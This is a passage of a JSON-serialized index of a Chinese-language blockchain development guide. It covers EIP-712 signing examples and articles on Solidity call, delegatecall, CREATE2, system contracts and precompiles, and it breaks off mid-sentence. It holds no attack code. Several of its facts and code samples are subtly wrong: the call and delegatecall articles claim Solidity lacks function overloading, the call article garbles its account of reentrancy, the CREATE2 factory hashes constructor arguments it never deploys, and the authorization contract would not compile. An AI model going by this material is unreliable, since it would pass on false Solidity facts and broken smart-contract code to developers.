age)。\n\n\n对实际的数据值进行编码。这是通过将数据结构中的每个字段值编码为ABI编码的顺序排列来实现的。例如，如果Person结构的实例是{name: &quot;Alice&quot;, age: 30}，则编码后的数据将是[&quot;Alice&quot;, 30]。\n\n\n将类型编码和值编码组合在一起，然后计算结果的keccak256哈希。这将产生结构化数据的唯一表示。\n\n\n4. 签名过程\nEIP-712签名过程包括以下几个步骤：\n\n\n计算域分隔符的哈希。这是通过对域分隔符数据结构进行编码和哈希来实现的。\n\n\n计算结构化数据的哈希。\n\n\n将域分隔符哈希和数据哈希组合在一起，然后计算结果的keccak256哈希。\n\n\n使用以太坊私钥对最终哈希进行签名。\n\n\n签名完成后，可以将签名与原始数据一起发送到智能合约。智能合约可以使用签名者的公钥恢复签名以验证其有效性。\nEIP-712使用案例\nEIP-712可用于各种以太坊智能合约和DApp场景，例如：\n\n\n身份验证：用户可以对包含其个人信息的结构化数据进行签名，以证明自己的身份。这对于去中心化身份管理系统非常有用。\n\n\n授权：用户可以对特定操作（例如投票、贷款、交易等）的结构化数据进行签名，以授权智能合约执行该操作。\n\n\n订单签署：在去中心化交易所（DEX）中，用户可以对交易订单的结构化数据进行签名，以创建一个有效的交易请求。\n\n\n身份验证\n为了演示EIP-712如何应用于身份验证，我们将创建一个简单的智能合约，该合约允许用户通过对包含其个人信息的结构化数据进行签名来证明其身份。我们将遵循以下步骤：\n1. 定义域分隔符和数据结构\n首先，我们需要定义一个身份验证请求的数据结构以及与智能合约相关的域分隔符。在Solidity合约中，我们可以这样做：\npragma solidity ^0.8.0;\n \nimport &quot;@openzeppelin/contracts/utils/cryptography/draft-EIP712.sol&quot;;\n \ncontract IdentityVerification is EIP712 {\n    struct Identity {\n        string name;\n        uint256 age;\n        string country;\n        uint256 timestamp;\n    }\n \n    bytes32 private constant IDENTITY_TYPEHASH = keccak256(&quot;Identity(string name,uint256 age,string country,uint256 timestamp)&quot;);\n \n    constructor() EIP712(&quot;IdentityVerification&quot;, &quot;1&quot;) {}\n \n    // ...\n}\n在这个例子中，我们定义了一个名为Identity的结构，其中包含用户的姓名、年龄和国籍，以及请求的时间戳。我们还计算了这个结构的类型哈希。\n2. 实现签名验证功能\n接下来，我们需要在合约中实现一个方法来验证用户对Identity结构实例的签名。这将包括以下步骤：\n\n计算数据的哈希。\n从签名中恢复签名者的地址。\n验证签名者地址是否与期望的地址匹配。\n\n我们可以在Solidity合约中实现这个功能，如下所示：\n// ...\n \nfunction verifyIdentity(\n    address signer,\n    string memory name,\n    uint256 age,\n    string memory country,\n    uint256 timestamp,\n    uint8 v,\n    bytes32 r,\n    bytes32 s\n) public view returns (bool) {\n    Identity memory identity = Identity(name, age, country, timestamp);\n    bytes32 digest = _hashTypedDataV4(keccak256(abi.encode(IDENTITY_TYPEHASH, keccak256(bytes(name)), age, keccak256(bytes(country)), timestamp)));\n    address recoveredAddress = ecrecover(digest, v, r, s);\n    return recoveredAddress == signer;\n}\n \n// ...\n在这个例子中，我们首先使用EIP-712规范计算数据的哈希。然后，我们使用ecrecover函数从签名中恢复签名者的地址，并将其与提供的signer地址进行比较。如果这两个地址相同，那么我们认为签名是有效的。\n3. 使用EIP-712对数据进行签名\n为了与智能合约交互，用户需要使用其私钥对一个Identity结构实例进行签名。这可以在前端应用程序中使用Web3.js或Ethers.js库完成。以下是使用Ethers.js进行签名的示例代码：\nimport { ethers } from &quot;ethers&quot;;\n \nasync function signIdentity(identity, privateKey) {\n    const domain = {\n        name: &quot;IdentityVerification&quot;,\n        version: &quot;1&quot;,\n          chainId: 1, // Use the correct chainId for the deployed contract\n        verifyingContract: &quot;0x...&quot;, // Address of the deployed IdentityVerification contract\n    };\n \n    const types = {\n        Identity: [\n            { name: &quot;name&quot;, type: &quot;string&quot; },\n            { name: &quot;age&quot;, type: &quot;uint256&quot; },\n            { name: &quot;country&quot;, type: &quot;string&quot; },\n            { name: &quot;timestamp&quot;, type: &quot;uint256&quot; },\n        ],\n    };\n \n    const signer = new ethers.Wallet(privateKey);\n    const data = {\n        types,\n        domain,\n        primaryType: &quot;Identity&quot;,\n        message: identity,\n    };\n \n    const signature = await signer._signTypedData(domain, types, identity);\n    return signature;\n}\n      \n这个signIdentity函数接收一个Identity结构实例和一个私钥，然后使用Ethers.js库的_signTypedData方法对其进行签名。请注意，您需要使用与合约部署的网络相对应的chainId。\n4. 在前端应用程序中验证签名\n有了签名后，我们可以在前端应用程序中调用智能合约的verifyIdentity方法来验证签名是否有效。以下是一个示例：\nasync function verifySignature(identity, signature, contract) {\n    const [v, r, s] = ethers.utils.splitSignature(signature);\n    const signerAddress = &quot;0x...&quot;; // Address corresponding to the private key used for signing\n \n    const result = await contract.verifyIdentity(\n        signerAddress,\n        identity.name,\n        identity.age,\n        identity.country,\n        identity.timestamp,\n        v,\n        r,\n        s\n    );\n \n    if (result) {\n        console.log(&quot;Signature is valid!&quot;);\n    } else {\n        console.log(&quot;Signature is invalid!&quot;);\n    }\n}\n这个verifySignature函数接收一个Identity结构实例、一个签名和一个IdentityVerification合约的实例。我们首先使用Ethers.js的splitSignature方法将签名拆分为v、r和s组件。然后，我们调用合约的verifyIdentity方法并传入相应的参数。如果返回结果为true，则签名有效；否则，签名无效。\n授权\n1. 创建智能合约\n首先，我们需要创建一个用于授权的智能合约。在这个合约中，我们定义一个Authorization结构，以及一个用于验证EIP-712签名的方法。\npragma solidity ^0.8.0;\nimport &quot;@openzeppelin/contracts/utils/cryptography/draft-EIP712.sol&quot;;\n \ncontract Authorization is EIP712 {\n    struct Authorization {\n        address grantor;\n        address grantee;\n        uint256 expiry;\n    }\n \n    bytes32 private constant AUTHORIZATION_TYPEHASH =\n        keccak256(&quot;Authorization(address grantor,address grantee,uint256 expiry)&quot;);\n \n    constructor() EIP712(&quot;Authorization&quot;, &quot;1&quot;) {}\n \n    function verifyAuthorization(\n        address grantor,\n        address grantee,\n        uint256 expiry,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) external view returns (bool) {\n        bytes32 structHash =\n            keccak256(abi.encode(AUTHORIZATION_TYPEHASH, grantor, grantee, expiry));\n        bytes32 digest = _hashTypedDataV4(structHash);\n        address signer = ECDSA.recover(digest, v, r, s);\n \n        return signer == grantor;\n    }\n}\n在这个合约中，我们使用了OpenZeppelin的EIP712合约。我们定义了一个Authorization结构，它包含了授权者（grantor）、被授权者（grantee）以及授权过期时间。我们还定义了一个verifyAuthorization方法，该方法使用EIP-712签名验证授权。\n2. 签名授权\n接下来，我们需要在前端应用程序中创建一个授权对象，并使用EIP-712对其进行签名。我们可以使用Ethers.js库来实现这一点。\nconst ethers = require(&quot;ethers&quot;);\n \nasync function signAuthorization(authorization, privateKey) {\n    const domain = {\n        name: &quot;Authorization&quot;,\n        version: &quot;1&quot;,\n        chainId: 1, // Use the correct chainId for the deployed contract\n        verifyingContract: &quot;0x...&quot;, // Address of the deployed Authorization contract\n    };\n \n    const types = {\n        Authorization: [\n            { name: &quot;grantor&quot;, type: &quot;address&quot; },\n            { name: &quot;grantee&quot;, type: &quot;address&quot; },\n            { name: &quot;expiry&quot;, type: &quot;uint256&quot; },\n        ],\n    };\n \n    const signer = new ethers.Wallet(privateKey);\n    const data = {\n        types,\n        domain,\n        primaryType: &quot;Authorization&quot;,\n        message: authorization,\n    };\n \n    const signature = await signer._signTypedData(domain, types, authorization);\n    return signature;\n}\n这个signAuthorization函数接收一个Authorization结构实例和一个私钥，然后使用Ethers.js库的_signTypedData方法对其进行签名。注意要使用与合约部署的网络相对应的chainId。\n3. 验证签名\n有了签名后，我们可以在前端应用程序中调用智能合约的“verifyAuthorization方法来验证签名是否有效。首先，我们需要将签名分解为v, r, 和s`组件，然后调用智能合约的方法。\nconst ethers = require(&quot;ethers&quot;);\n \nasync function verifySignature(contract, authorization, signature) {\n    const sig = ethers.utils.splitSignature(signature);\n \n    const isValid = await contract.verifyAuthorization(\n        authorization.grantor,\n        authorization.grantee,\n        authorization.expiry,\n        sig.v,\n        sig.r,\n        sig.s\n    );\n \n    return isValid;\n}\n这个verifySignature函数接收一个已部署的Authorization智能合约实例、一个Authorization结构实例和一个签名。它将签名拆分为v, r, 和s组件，然后调用verifyAuthorization方法来验证签名。\n示例：\n现在我们可以在一个完整的例子中展示如何使用EIP-712签名来处理授权。\nasync function main() {\n    // Replace with your privateKey and contract address\n    const privateKey = &quot;0x...&quot;;\n    const contractAddress = &quot;0x...&quot;;\n \n    const provider = new ethers.providers.JsonRpcProvider(&quot;http://localhost:8545&quot;);\n    const wallet = new ethers.Wallet(privateKey, provider);\n \n    const Authorization = await ethers.getContractFactory(&quot;Authorization&quot;);\n    const contract = Authorization.attach(contractAddress).connect(wallet);\n \n    const authorization = {\n        grantor: wallet.address,\n        grantee: &quot;0x...&quot;,\n        expiry: Date.now() + 60 * 60 * 1000, // Expires in 1 hour\n    };\n \n    const signature = await signAuthorization(authorization, privateKey);\n    console.log(&quot;Signature:&quot;, signature);\n \n    const isValid = await verifySignature(contract, authorization, signature);\n    console.log(&quot;Is signature valid?&quot;, isValid);\n}\n \nmain().catch((error) =&gt; {\n    console.error(error);\n    process.exit(1);\n});\n这个示例将演示如何创建一个授权对象、使用EIP-712对其进行签名，然后调用智能合约的verifyAuthorization方法来验证签名是否有效。\n总结\nEIP-712为以太坊生态系统中的结构化数据签名提供了一种类型化的方法，提高了签名数据的安全性和可读性。通过使用EIP-712，开发人员可以更轻松地为其智能合约和DApp实现安全、可靠且易于理解的签名功能。"},"blockchainguide/DApp_Development/eip/ERC1167详解":{"slug":"blockchainguide/DApp_Development/eip/ERC1167详解","filePath":"blockchainguide/DApp_Development/eip/ERC1167详解.md","title":"ERC1167详解","links":[],"tags":[],"content":"mirror.xyz/xyyme.eth/mmUAYWFLfcHGCEFg8903SweY3Sl-xIACZNDXOJ3twz8"},"blockchainguide/DApp_Development/eip/ERC1967详解":{"slug":"blockchainguide/DApp_Development/eip/ERC1967详解","filePath":"blockchainguide/DApp_Development/eip/ERC1967详解.md","title":"ERC1967详解","links":[],"tags":[],"content":"eips.ethereum.org/EIPS/eip-1967"},"blockchainguide/DApp_Development/eip/ERC2535详解":{"slug":"blockchainguide/DApp_Development/eip/ERC2535详解","filePath":"blockchainguide/DApp_Development/eip/ERC2535详解.md","title":"ERC2535详解","links":[],"tags":[],"content":"eip2535详解www.jianshu.com/p/6d727c6d3e1d\neips.ethereum.org/EIPS/eip-2535"},"blockchainguide/DApp_Development/solidity-tech":{"slug":"blockchainguide/DApp_Development/solidity-tech","filePath":"blockchainguide/DApp_Development/solidity-tech.md","title":"solidity-tech","links":[],"tags":[],"content":"合约基础\nsolidity\nsolidity 推荐写法\nsolidity 常见bug\n常用框架\ntruffle\nweb3.js\nhardhat\n合约测试\n合约安全\n合约案例\n合约安全审计"},"blockchainguide/DApp_Development/主流链内置合约玩法":{"slug":"blockchainguide/DApp_Development/主流链内置合约玩法","filePath":"blockchainguide/DApp_Development/主流链内置合约玩法.md","title":"主流链内置合约玩法","links":[],"tags":[],"content":"bsc\n创世合约里配置了系统合约，且地址是写死的，比如0x00000000000000001001, 会分配初始钱\n然后会在第一个块进行初始化的调用。\n使用案例\na: 获取validator  ，这个方式是通过eth api 调用，因为不需要网络通信延迟，所以很快\nmethod := &quot;getValidators&quot;\n \n// 指定的方法名和参数列表打包成一个 ABI 编码的字节数组\ndata, err := p.validatorSetABIBeforeLuban.Pack(method)\n \n// 系统合约调用 \nmsgData := (hexutil.Bytes)(data)\n\ttoAddress := common.HexToAddress(systemcontracts.ValidatorContract)\n\tgas := (hexutil.Uint64)(uint64(math.MaxUint64 / 2))\n\tresult, err := p.ethAPI.Call(ctx, ethapi.TransactionArgs{\n\t\tGas:  &amp;gas,\n\t\tTo:   &amp;toAddress,\n\t\tData: &amp;msgData,\n\t}, blockNr, nil)\n \n// 将一个 ABI 编码的返回结果反序列化为含有具体类型数据的 Go 结构体（valSet）\nvar valSet []common.Address\nerr = p.validatorSetABIBeforeLuban.UnpackIntoInterface(&amp;valSet, method, result)\nb: 分配奖励\n惩罚和分配奖励是由出块人来做的事情，也就是from是miner,to 是要调用的合约，在finalize阶段会创建，并且在其阶段就会处理完这个交易，直接通过callmsg来生成消息，然后通过applyTransaction底层操作。\n// 生成系统交易\n\tmethod := &quot;distributeFinalityReward&quot;\n\tdata, err := p.validatorSetABI.Pack(method, validators, weights)\n\tif err != nil {\n\t\tlog.Error(&quot;Unable to pack tx for distributeFinalityReward&quot;, &quot;error&quot;, err)\n\t\treturn err\n\t}\n\tmsg := p.getSystemMessage(header.Coinbase, common.HexToAddress(systemcontracts.ValidatorContract), data, common.Big0)\n\treturn p.applyTransaction(msg, state, header, cx, txs, receipts, systemTxs, usedGas, mining)\n \nquorum\n预编译合约\n以太坊的预编译合约不需要部署到以太坊上，因为它们已经作为区块链客户端（如 geth 或 OpenEthereum）的一部分实现。预编译合约主要用于处理复杂的计算，如加密哈希函数、椭圆曲线签名验证等，它们的地址是预先定义的，通常是较低的地址。\n这些预编译合约的主要目的是提高某些计算密集型操作的性能。它们是在客户端的底层代码中实现的，而不是智能合约字节码。当 EVM 遇到一个预编译合约的地址时，它将直接调用相应的底层代码实现，而不是执行合约字节码。这样可以显著提高这些操作的执行速度。\n原理：\n生成的EVM指令中，Solidity编译器会将预编译合约ecrecover的地址（0x1）作为目标地址。接着，在EVM执行STATICCALL指令时，它会检查这个目标地址并发现它对应一个预编译合约，然后调用相应的底层实现\n自定义预编译合约"},"blockchainguide/DApp_Development/合约基础/solidity_call":{"slug":"blockchainguide/DApp_Development/合约基础/solidity_call","filePath":"blockchainguide/DApp_Development/合约基础/solidity_call.md","title":"solidity_call","links":[],"tags":[],"content":"Solidity 中的 call 函数是一种低级别的函数调用方式，它允许智能合约在用于与其他合约进行交互时具有更高的灵活性。本文将详细介绍 Solidity 中的 call 函数，包括其语法、用法、应用场景、注意点和安全性。\n语法\ncall 函数的语法如下：\n(bool success, bytes memory returnData) = address.functionName{value: amount}(arguments);\n\n其中：\n\nbool success：标志函数调用是否成功。\nbytes memory returnData：包含函数调用结果的字节数组（返回值）。\naddress：要调用的合约地址。\nfunctionName：要调用的函数名。\nvalue: amount：可选的转移金额（以 wei 为单位），用于向目标合约转移 ether。\narguments：传递给目标函数的参数。\n\ncall 函数的返回值包含两个部分：bool success 和 bytes memory returnData。如果函数调用成功，则 success 为 true，否则为 false。returnData 包含函数调用的返回值或错误信息。需要注意的是，由于 Solidity 不支持重载函数，因此 functionName 只能是被调用函数的确切名称，而不能是同名函数的不同版本。\n用法\ncall 函数广泛应用于 Solidity 合约中，以便执行以下操作：\n\n调用其他合约的函数。 call 函数允许合约在其他合约中调用函数，而不需要事先知道其他合约中函数的实现细节。 这是因为调用方不需要知道其他合约的源代码，只需要知道它的地址和函数签名即可。在这种情况下，call 函数可以返回目标合约函数的输出或错误信息。\n\n以下是一个示例，该示例调用另一个合约的 balanceOf 函数来获取给定地址的 ETH 余额：\npragma solidity ^0.8.3;\n \ncontract MyContract {\n  function getBalance(address _token, address _address) external view returns(uint256) {\n    (bool success, bytes memory data) = _token.call(abi.encodeWithSignature(&quot;balanceOf(address)&quot;, _address));\n    require(success, &quot;Failed to get balance&quot;);\n    return abi.decode(data, (uint256));\n  }\n}\n在上述代码中，call 函数调用了 _token 合约的 balanceOf 函数，并将 _address 作为参数传递给该函数。如果调用成功，则函数将返回给定地址 _address 在 _token 合约中的 ETH 余额。\n\n向其他合约发送 ETH。 合约可以使用 call 函数向其他合约发送 ETH。发生此操作时，合约需要设置在发送交易时要转移的以太币金额。在这种情况下，call 函数可以返回接收方合约中的状态或错误信息。\n\n以下是一个示例，该示例向另一个合约发送 ETH，然后从该 contracts 合约中检索余额并确保已正确收到 ETH：\npragma solidity ^0.8.3;\n \ncontract MyContract {\n  function sendEth(address payable _to) external payable {\n    (bool success,) = _to.call{value: msg.value}(abi.encodeWithSignature(&quot;dummy()&quot;));\n    require(success, &quot;Failed to send ether&quot;);\n  }\n}\n \ncontract OtherContract {\n  mapping (address =&gt; uint256) public balances;\n \n  constructor() payable {}\n \n  receive() external payable {\n    balances[msg.sender] += msg.value;\n  }\n \n  function dummy() external {}\n}\n在上述代码中，MyContract 合约中的 sendEth 函数使用 call 函数向 OtherContract 合约发送 ETH。value: msg.value 设置将要转移的以太币数量。 接着，receive 函数会接收传入的 ETH 并将其余额添加到余额映射中。最后，我们可以使用 balances 映射来检索一个地址在 OtherContract 合约中的余额。\n应用场景\n以下是几个 Solidity 中使用 call 函数的常见应用场景：\n\n\n委托合约实现。 智能合约可以将某些操作委托给其他智能合约来执行。这可能是因为合约调用者没有当前的权限或信息，或者因为合约不希望直接执行某些操作。在这种情况下，合约可以使用 call 函数调用另一个合约以执行操作，并可选地接收调用结果。\n\n\nERC-20 标准。许多 ERC-20 代币都是作为智能合约实现的，并使用 call 函数在其他合约中转移代币。这是因为 ERC-20 代币标准规定了需要包含的函数名称和参数，并指定了传递给以太坊的代币信息的格式。\n\n\n钱包管理。 在钱包 Dapps 中，用户使用智能合约来管理其加密货币，例如以太币和 ERC-20 代币。在这种情况下，合约需要使用 call 函数与以太坊主链和其他合约进行交互，并执行必要的功能，例如存储加密货币余额和合约操作。\n\n\n注意点和安全性\n在使用 call 函数时，存在以下注意点和安全性问题：\n\n\n可能遭受恶意攻击。由于底层代码在运行之前不会检查它们的输入或输出数据，因此可能会导致合约受到各种安全攻击。在使用 call 函数时，请通过分析目标合约的源代码和源码可靠性来验证其安全性。\n\n\ncall 函数可能会消耗更多的 Gas。由于 call 是 Solidity 中的低级函数，因此需要更多的 Gas 来执行。如果使用过多的 call 函数，可能会使合约变得不可用，因为它可能超过了以太坊当前块的 Gas 限制。\n\n\n需要对错误进行检查。在使用 call 函数后，始终需要检查返回的值以确保调用成功。否则，您可能会遇到信息泄漏和其他安全问题。\n\n\n总之，call 函数是 Solidity 中非常有用的低级函数之一，并在智能合约的开发过程中被广泛使用。但是，在使用之前需要仔细考虑一些问题，并遵循最佳实践，以确保程序的安全和有效性。"},"blockchainguide/DApp_Development/合约基础/solidity_callcode":{"slug":"blockchainguide/DApp_Development/合约基础/solidity_callcode","filePath":"blockchainguide/DApp_Development/合约基础/solidity_callcode.md","title":"solidity_callcode","links":[],"tags":[],"content":"Solidity 中的 Call 方法\ncall 方法是 Solidity 中一个提供了低级别函数调用的方法。这意味着 call 方法可以在 Solidity 合约中调用外部合约的函数。这种方法相对于 external 可见性更加灵活，因为它可以动态地执行函数调用，而不用提前知道要调用哪个函数。在本文中，我们将详细介绍 Solidity 中的 call 方法及其应用场景、注意点和安全性。\nSolidity 中的 Call 用法\n在 Solidity 中，call 方法允许将给定的字节数组作为函数参数传递，并将该函数调用发送到指定的合约地址。call 方法的语法如下：\n(bool success, bytes memory returnData) = address.call(bytes memory data);\n请注意，在调用 call 方法时，必须将要调用的合约地址转换为 address 类型。如果调用成功，将返回一个布尔值 success 和一个类型为 bytes 的数据 returnData。 success 值指示调用是否成功，returnData 存储从调用中返回的字节数组。\n同时，需要注意的是，在调用外部合约时，需要使用自己的 ETH 或者从当前合约地址发送的 ETH 来支付 GAS 费用。因为 Solidity 不能直接在合约之间传递 Ether，所以您需要使用 call() 带上 value 参数来发送 ETH。\n下面是 Solidity 中调用 call 的示例：\npragma solidity ^0.8.0;\n \ncontract Example {\n    function callExternalContract(address externalContractAddress) public returns (bytes memory) {\n        bytes memory data = abi.encodeWithSignature(&quot;myFunction(uint256)&quot;, 123);\n        (bool success, bytes memory returnData) = externalContractAddress.call(data);\n        require(success, &quot;Call failed.&quot;);\n \n        return returnData;\n    }\n}\n在这个示例中，我们定义了一个名为 callExternalContract 的函数，该函数使用参数 externalContractAddress 作为传递给外部合约的目标地址。我们使用 abi.encodeWithSignature 帮助程序将调用数据打包为字节数组 data。\n然后，我们调用 call 方法将此数据发送到外部合约地址。如果调用成功，该方法将返回 success 和 returnData，并且我们可以使用返回的 returnData 来处理外部合约执行的结果。\nSolidity 中 Call 方法的应用场景\ncall 方法是 Solidity 中非常重要的方法之一，它允许我们从当前合约中动态地执行函数调用。这使得 Solidity 的智能合约更加灵活和可编程。下面是一些 call 方法的应用场景：\n\n与其他智能合约进行通信：使用 call 方法调用其他智能合约非常常见。例如，您可能希望从一个智能合约中调用另一个智能合约以执行某些操作。这是 defi 生态系统中使用最频繁的方法之一。\n链下查询：使用 call 方法调用 Oracle 等外部系统，这些系统不在区块链上。例如，您可能需要使用外部数据来帮助智能合约作出决策，那么您就需要执行对外部数据的查询。\n\nSolidity 中 Call 的注意事项\n想要使用 call 方法时，我们需要注意以下几点：\n\n始终检查成功标志。\n\n在 call 方法调用后，必须始终检查 success 值以确认函数调用是否成功。如果 success 的值为 false，可能是由于目标合约执行失败或者 gas 不足。如果没有检查 success 值，您的合约将依然运行，但是可能会执行其他不必要的行为。\n\n撤销攻击 (Reentrancy attack) 的风险\n\n如果您使用 call 来执行外部函数调用，则必须注意该函数中是否包含了任何可以引起撤销攻击的代码。如何避免撤销攻击超出了本文的范围，但是这是使用 call 方法时需要注意的重要注意事项。在避免撤销攻击的过程中，call 中的 msg.sender 变量会被更新，确保它只表示当前合约的调用者。\n\n可能会超出 Gas 价格\n\n在使用 call 方法时，必须注意 Gas 的限制。如果 call 方法使用的 Gas 太多，将导致它的执行被终止，并且将 Gas 视为 “消耗” 的操作将回滚。这可能会导致函数调用失败。要避免此类问题，您应该使用 gas() 函数来获取当前 Gas 限制，并检查 call 方法的成本是否超出了该限制。如果成本过高，则可以尝试增加 Gas 的限制或使用更简单的逻辑。此外，根据需要使用 gas 参数或 estimateGas() 函数来为 call 函数调用指定精确的 gas 用量和预估的 gas 用量。\nSolidity 中 Call 方法的安全性\n尽管 call 方法强大而灵活，但是它也可以被不善意的第三方滥用。攻击者可以使用 call 方法来执行不当代码并引起重大损失。以下是几种常见的风险：\n\n奇怪的地址\n\n如果您使用的合约地址来自不受信任的源，那么调用可能会被劫持并被重定向到攻击者的地址上。因此，当使用 call 向另一个合约发送 Ether 时，需要确保合约地址是合法的，且来自受信任的源。\n\n错误的函数调用\n\ncall 函数的参数必须准确地匹配要调用的函数，否则将导致执行失败，这包括函数签名、参数类型和参数数量。因此，需要确保正确编写了 call 函数，并运行测试以确保它能够正常执行。\n\n恶意合约\n\n可以轻松编写能够使用 call 逻辑结构的恶意合约，以便攻击其他的智能合约。因此，对于 call 方法，需要确保只使用来自受信任的源的合约地址，并对输入数据进行验证。\n总结\n本文提供了关于 Solidity 中 call 方法的详细信息。我们了解了该方法的用途、语法和应用程序，并介绍了使用该方法时需要注意的事项和安全性问题。最好的实践中将 call 与 Solidity 中的其他函数结合使用，以便从合约中调用其他合约或执行支持逻辑 的操作，同时确保安全性和正确性。在编写智能合约时，始终应该考虑问题的安全性和正确性。"},"blockchainguide/DApp_Development/合约基础/solidity_create2":{"slug":"blockchainguide/DApp_Development/合约基础/solidity_create2","filePath":"blockchainguide/DApp_Development/合约基础/solidity_create2.md","title":"solidity_create2","links":[],"tags":[],"content":"使用CREATE2部署智能合约\n简介\nCREATE2 是 Ethereum EVM 中的一种操作码，用于部署智能合约。与 CREATE 操作码不同，CREATE2 的独特之处在于它允许在部署合约之前预测合约地址。这种特性为开发者提供了新的部署方法和更多的灵活性，特别是在需要预测合约地址的场景下。\n创建合约地址的原理\n在 Ethereum 中，合约地址是通过部署者地址和该地址的随机数（nonce）计算得出的。CREATE2 改变了这种计算方式，通过部署者地址、一个盐值（salt）和合约的字节码进行计算。这意味着，只要部署者、盐值和字节码不变，合约地址将始终相同。\n计算公式如下：\nkeccak256( 0xff ++ address ++ salt ++ keccak256(init_code))[12:]\n\n使用案例\n1. 预测合约地址\n由于 CREATE2 计算合约地址的方式，它可以让开发者在部署合约之前知道合约地址。这种特性对于某些去中心化应用（如闪电网络和状态通道）非常有用。\n2. 惰性部署\n开发者可以在需要时才部署合约，而在此之前，他们可以预先告知用户合约的地址。这样一来，用户可以在合约实际部署之前与其交互，从而节省部署成本。\n3. 代理合约模式\n在某些场景下，开发者可能希望部署多个功能相似的合约。使用 CREATE2 可以创建一个固定地址的代理合约，从而使得所有相关合约共享相同的接口。\n如何使用 CREATE2\n以下是一个使用 Solidity 实现的简单示例，演示了如何使用 CREATE2 部署合约。\npragma solidity ^0.8.0;\n \ncontract DeployedContract {\n    uint256 public value;\n \n    constructor(uint256 _value) {\n        value = _value;\n    }\n}\n \ncontract Factory {\n    function deploy(uint256 _value, bytes32 _salt) public {\n        bytes memory bytecode = type(DeployedContract).creationCode;\n        bytes32 bytecodeHash = keccak256(abi.encodePacked(bytecode, _value));\n \n        address addr;\n        assembly {\n            addr := create2(0, add(bytecode, 32), mload(bytecode), _salt)\n        }\n        \n        require(addr != address(0), &quot;Failed to deploy contract&quot;);\n    }\n \n    function predictAddress(uint256 _value, bytes32 _salt) public view returns (address) {\n        bytes memory bytecode = type(DeployedContract).creationCode;\n        bytes32 bytecodeHash = keccak256(abi.encodePacked(bytecode, _value));\n        \n        return address(uint160(uint256(keccak256(abi.encodePacked(\n            byte(0xff),\n            address(this),\n            _salt,\n            bytecodeHash\n        )))));\n    }\n}\n \n场景\n灵活部署合约"},"blockchainguide/DApp_Development/合约基础/solidity_delegatecall":{"slug":"blockchainguide/DApp_Development/合约基础/solidity_delegatecall","filePath":"blockchainguide/DApp_Development/合约基础/solidity_delegatecall.md","title":"solidity_delegatecall","links":[],"tags":[],"content":"Solidity 中的 Delegatecall\n在 Solidity 中，delegatecall 是一种让一个合约调用另一个合约，并使用调用者的存储空间来存储结果的机制。这种调用是低级别的，因为它不仅仅调用另一个合约的函数，还可以在调用者合约的上下文中执行。使用 delegatecall 可以实现一些比较高级的合约操作，例如合约升级或安全库的使用。\n语法\ndelegatecall 的语法如下：\n(bool success, bytes memory returnData) = address.delegatecall(functionSignature);\n\n其中：\n\nbool success：标志函数调用是否成功。\nbytes memory returnData：包含函数调用结果的字节数组（返回值）。\naddress：要调用的合约地址。\nfunctionSignature：要调用的目标合约中的函数签名和参数。\n\ndelegatecall 函数的返回值包含两个部分：bool success 和 bytes memory returnData。如果函数调用成功，则 success 为 true，否则为 false。returnData 包含函数调用的返回值或错误信息。需要注意的是，由于 Solidity 不支持重载函数，因此 functionSignature 必须是被调用函数的确切名称和参数，而不能是同名函数的不同版本。\n应用场景\n以下是使用 delegatecall 的一些常见应用场景：\n1. 安全库\n使用 delegatecall 可以实现一种安全库机制，其中合约代码分开分成两部分：一个存储状态和变量的主体合约和一个包含可重用代码片段的合约库。合约主体合约可以使用 delegatecall 调用合约库，以便保存并使用库中的状态和逻辑。通过这种方式，合约库可以成为可视为标准软件库的任何安全代码。\n2. 合约升级\n使用 delegatecall 机制，可以在不影响存储的情况下更新合约代码。在这种情况下，更新代码的合约将被部署到新的合约地址上，但是它将与旧的合约共享相同的存储空间。这样，新的合约可以使用 delegatecall 函数调用旧的合约，获取先前存储的状态，并在新合约中运行更新的逻辑。此举可以节省大量的数据迁移和存储操作。\n3. 协议间调用\n为了让不同的协议之间进行交互，可以使用 delegatecall 来调用其他协议包含的合约函数。这可以避免在协议之间传递大量的数据和状态，提高协议之间的互操作性和可扩展性。\n举例\n以下是一个示例，该示例展示了如何使用 delegatecall 调用目标合约：\npragma solidity ^0.8.0;\n\ncontract Target {\n    function getName() public pure returns (string memory) {\n        return &quot;Target Contract&quot;;\n    }\n}\n\ncontract Caller {\n    function callGetName(address _target) public returns (string memory) {\n        (bool success, bytes memory returnData) = _target.delegatecall(\n            abi.encodeWithSignature(&quot;getName()&quot;) // 调用目标合约的 getName 函数\n        );\n        require(success, &quot;Delegatecall to target contract failed&quot;);\n        return abi.decode(returnData, (string)); // 解码返回的字节数组\n    }\n}\n\n\n注意点和安全性\n在使用 delegatecall 时，存在以下注意点和安全性问题：\n\n\n数据格式和存储不一致。由于 delegatecall 可以共享存储，因此合约在更新时需要特别注意确保数据格式和状态保持一致，否则可能会导致合约失败或安全漏洞。\n\n\n冲突名称。由于 delegatecall 不会更改调用者合约的 msg.sender 值，因此在两个合约具有相同函数名的情况下可能会发生冲突。为了解决这个问题，可以在函数签名中添加一个前缀来确保它们唯一。\n\n\n披露信息。由于 delegatecall 可能会导致信息泄露，因此需要小心使用，并使用加密和匿名方式保护敏感信息。\n\n\n通过测试和审计验证代码。在使用 delegatecall 之前，需要完成全面的测试和审计，以确保代码和逻辑正确并完全安全。\n\n\n总之，delegatecall 是 Solidity 中非常有用的低级函数之一，并在智能合约的开发过程中被广泛使用。但是，在使用之前需要仔细考虑一些问题，并遵循最佳实践，以确保程序的安全和有效性。"},"blockchainguide/DApp_Development/合约基础/solidity_fallback和receive":{"slug":"blockchainguide/DApp_Development/合约基础/solidity_fallback和receive","filePath":"blockchainguide/DApp_Development/合约基础/solidity_fallback和receive.md","title":"solidity_fallback和receive","links":[],"tags":[],"content":"参考\ndocs.soliditylang.org/en/v0.6.7/060-breaking-changes.html#semantic-and-syntactic-changes\nmirror.xyz/ninjak.eth/EroVZqHW1lfJFai3umiu4tb9r1ZbDVPOYC-puaZklAw\nblog.csdn.net/weixin_45719444/article/details/121161842"},"blockchainguide/DApp_Development/合约基础/solidity_selector":{"slug":"blockchainguide/DApp_Development/合约基础/solidity_selector","filePath":"blockchainguide/DApp_Development/合约基础/solidity_selector.md","title":"solidity_selector","links":[],"tags":[],"content":"什么是 Solidity selector？\n在 Solidity 中，函数参数和名称的组合将构成一个确定的 Solidity 函数标识符，称之为 Solidity selector 或 funchash。Solidity selector 在函数调用时起到了关键作用，作为函数的「指纹」标识符，确保在 Solidity 合约中唯一识别每个函数。如果两个函数参数和名称的组合相同但返回类型不同，则它们会有不同的 Solidity selector。\nSolidity selector 是一个将函数的参数和名称 Hash 运算后得到的 4 